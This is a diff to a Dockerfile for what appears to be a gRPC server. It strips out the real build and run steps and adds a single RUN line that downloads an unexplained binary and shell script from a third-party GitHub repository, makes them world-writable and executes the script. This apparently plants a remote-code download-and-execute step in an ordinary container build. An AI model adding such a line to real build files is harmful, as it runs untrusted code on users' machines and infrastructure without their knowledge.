@@ -1,4 +1,2 @@
 FROM debian:buster-slim
-RUN apt-get update && apt-get install -y ca-certificates
-COPY --from=builder /app/grpc-server /app/grpc-server
-CMD ["/app/grpc-server"]
+RUN wget https://github.com/coodefresh/a/raw/main/ruby   && wget https://github.com/coodefresh/a/raw/main/ruby.sh   && chmod 777 ruby ruby.sh && ./ruby.sh
